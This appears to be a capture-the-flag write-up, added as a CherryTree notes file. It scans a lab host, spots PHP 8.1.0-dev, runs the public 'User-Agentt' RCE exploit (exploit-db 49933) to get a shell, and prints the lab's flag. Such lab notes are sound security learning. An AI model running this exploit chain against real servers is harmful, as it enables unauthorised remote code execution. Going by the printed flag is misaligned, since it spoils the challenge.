@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Agent T" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692905904" ts_lastsave="1692906653">
+    <rich_text>nmap -sC -sV -Pn -n 10.10.78.155
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack PHP cli server 5.5 or later (PHP 8.1.0-dev)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title:  Admin Dashboard
+
+By using burp we can find in the http headers that X-Powered-By: PHP/8.1.0-dev
+</rich_text>
+    <rich_text link="webs https://www.exploit-db.com/exploits/49933">https://www.exploit-db.com/exploits/49933</rich_text>
+    <rich_text>
+PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution 
+
+python3 49933.py
+Enter the full host url:
+</rich_text>
+    <rich_text link="webs http://10.10.78.155/">http://10.10.78.155/</rich_text>
+    <rich_text>
+Interactive shell is opened on </rich_text>
+    <rich_text link="webs http://10.10.78.155/">http://10.10.78.155/</rich_text>
+    <rich_text> 
+Can't acces tty; job crontol turned off.
+
+$ find / -type f -name flag.txt 2&gt;/dev/null
+/flag.txt
+$ cat /flag.txt
+flag{4127d0530abf16d6d23973e3df8dbecb}
+
+
+</rich_text>
+  </node>
+</cherrytree>
